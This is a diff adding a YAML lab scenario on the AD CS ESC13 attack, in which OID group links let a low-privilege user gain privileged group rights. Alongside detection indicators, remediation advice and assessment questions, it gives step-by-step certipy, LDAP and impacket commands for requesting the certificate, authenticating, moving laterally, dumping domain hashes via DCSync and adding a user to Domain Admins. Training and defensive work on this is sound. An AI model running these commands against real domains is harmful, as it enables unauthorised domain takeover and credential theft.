@@ -1,0 +1,185 @@
+# Category: Active Directory - AD CS Attacks
+name: "AD CS ESC13 — Issuance Policy OID Group Link Abuse"
+id: "ad-adcs-esc13-001"
+category: "active_directory"
+subcategory: "ad_cs_attacks"
+difficulty: "advanced"
+estimated_time: "90 minutes"
+
+description: |
+  Exploit Active Directory Certificate Services (AD CS) certificate templates
+  configured with issuance policies that have OID group links to privileged
+  Active Directory groups (ESC13). When a user authenticates with a certificate
+  containing such an issuance policy OID, the KDC includes the SID of the linked
+  group in the user's Kerberos TGT, effectively granting the user the privileges
+  of that group even though they are not an actual member.
+
+learning_objectives:
+  - Understand issuance policies and OID group links in AD
+  - Identify certificate templates with issuance policies linked to groups
+  - Request certificates that grant membership in privileged groups
+  - Map ESC13 to Microsoft's Authentication Mechanism Assurance (AMA)
+
+tools:
+  - certipy
+  - certify
+  - rubeus
+  - impacket
+  - powershell (ActiveDirectory module)
+  - Check-ADCSESC13.ps1
+
+prerequisites:
+  - Valid low-privilege domain credentials
+  - Enrollment rights on a certificate template with issuance policy linked to group
+  - The linked group must be a universal group (empty or not)
+  - Network access to AD CS CA (TCP 443 or 135)
+  - Understanding of Kerberos PAC and group membership
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate certificate templates and OID group links for ESC13"
+    commands:
+      - "# Install Certipy"
+      - "pip3 install certipy-ad"
+      - "# Full enumeration with OID group link detection"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -vulnerable -stdout"
+      - "# Look specifically for ESC13"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] | grep -E '(ESC13|Issuance Policy|Linked Group|OID)'"
+      - "# Enumerate OID objects specifically"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -oids"
+      - "# Use Check-ADCSESC13.ps1 from SpecterOps"
+      - "powershell -ExecutionPolicy Bypass -File Check-ADCSESC13.ps1"
+    expected_output: "Templates with issuance policies linked to groups (e.g., Enterprise Admins, Domain Admins)"
+    detection: "LDAP queries for OID objects and certificate template policies"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Identify specific OID group links and verify requirements"
+    commands:
+      - "# Query issuance policies and their group links via LDAP"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc1],DC=[dc2]' '(objectclass=msPKI-Enterprise-Oid)' msDS-OIDToGroupLink msPKI-Cert-Template-OID displayName"
+      - "# Check if linked groups are universal"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'DC=[dc1],DC=[dc2]' '(cn=[linked_group_name])' groupType"
+      - "# Verify enrollment rights on the template"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -stdout | grep -A20 '[template_name]'"
+      - "# Check template EKUs for client authentication"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=[template_name],CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc1],DC=[dc2]' pKIExtendedKeyUsage msPKI-Certificate-Policy"
+    expected_output: "OID group links, linked group types, and template enrollment permissions"
+    detection: "LDAP queries for OID container and group attributes"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Request certificate from ESC13 vulnerable template"
+    commands:
+      - "# Request certificate from the vulnerable template"
+      - "certipy req -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -template '[vulnerable_template]'"
+      - "# The certificate contains the issuance policy OID"
+      - "# Verify the certificate includes the issuance policy"
+      - "openssl pkcs12 -in [username].pfx -nodes -passin pass: | openssl x509 -noout -text | grep -A10 'Certificate Policies'"
+      - "# Check the OID in the certificate"
+      - "openssl pkcs12 -in [username].pfx -nodes -passin pass: | openssl x509 -noout -text | grep 'Policy Identifier'"
+    expected_output: "[username].pfx containing certificate with issuance policy OID"
+    detection: "Certificate request for template with issuance policy linked to group"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Authenticate with certificate to obtain TGT with linked group membership"
+    commands:
+      - "# Authenticate with the certificate via PKINIT"
+      - "certipy auth -pfx [username].pfx -dc-ip [dc_ip]"
+      - "# The TGT will include the SID of the linked group in the PAC"
+      - "# Use the resulting TGT"
+      - "export KRB5CCNAME=[username].ccache"
+      - "# Verify group membership"
+      - "# On Windows: whoami /groups"
+      - "# Or use the TGT for privileged operations"
+      - "impacket-psexec -k -no-pass [domain]/[username]@[dc_ip]"
+    expected_output: "TGT containing linked group SID; access to resources as group member"
+    detection: "Kerberos TGT with unusual group membership from certificate auth"
+
+  - id: "step5"
+    phase: "post_exploitation"
+    action: "Escalate using linked group privileges (e.g., Enterprise Admins)"
+    commands:
+      - "# If linked to Enterprise Admins, perform DCSync"
+      - "impacket-secretsdump -k -no-pass [domain]/[username]@[dc_ip] -just-dc"
+      - "# Or add yourself to Domain Admins (if linked group has permissions)"
+      - "net group 'Domain Admins' [username] /add /domain"
+      - "# Verify group membership"
+      - "net group '[linked_group_name]' /domain"
+      - "# Use privileges for lateral movement"
+      - "impacket-wmiexec -k -no-pass [domain]/[username]@[target_server]"
+    expected_output: "Domain hashes extracted or administrative privileges obtained"
+    detection: "DCSync or group modification from user with certificate-derived group membership"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "MITRE ATT&CK"
+    control: "T1078"
+    description: "Valid Accounts"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-3"
+    description: "Access Enforcement"
+  - standard: "CIS Controls v8"
+    control: "6.8"
+    description: "Define and maintain role-based access control"
+
+detection:
+  network_indicators:
+    - "Certificate enrollment for templates with issuance policies linked to privileged groups"
+    - "Kerberos TGTs with group memberships not matching user's actual groups"
+  log_indicators:
+    - "Event ID 4886 (CA): Certificate requested for template with OID group link"
+    - "Event ID 4768: Kerberos TGT with certificate containing issuance policy"
+    - "Event ID 4662: DCSync or privileged operations from unexpected user"
+    - "Defender for Identity: Suspicious certificate-based group membership"
+  endpoint_indicators:
+    - "Certipy req for templates with issuance policies"
+    - "Certificate authentication followed by privileged operations"
+    - "User performing actions as member of groups they don't belong to"
+
+remediation:
+  immediate:
+    - "Audit all issuance policies with msDS-OIDToGroupLink attributes"
+    - "Remove OID group links from issuance policies linked to privileged groups"
+    - "Restrict enrollment rights on templates with OID group links"
+    - "Enable Manager Approval for templates with issuance policies"
+    - "Monitor for certificate enrollments with issuance policies"
+  long_term:
+    - "Implement strict governance for issuance policy configuration"
+    - "Only link OID policies to groups with equivalent privilege levels"
+    - "Use Authentication Mechanism Assurance (AMA) only with dedicated, empty universal groups"
+    - "Regular audits of OID objects and their ACLs"
+    - "Monitor for certificate authentication events with unusual group memberships"
+    - "Consider disabling OID group links if AMA is not required"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  vulnerable_template: "SecureAdminsAuthentication"
+  linked_group_name: "Enterprise Admins"
+
+assessment_questions:
+  - "What is an OID group link and how does it enable privilege escalation?"
+  - "What are the requirements for a group to be linked via OID?"
+  - "How does the KDC use issuance policy OIDs during Kerberos authentication?"
+  - "What is Microsoft's Authentication Mechanism Assurance (AMA) and how does it relate to ESC13?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
+    title: "ADCS ESC13 Abuse Technique - SpecterOps"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned - SpecterOps"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
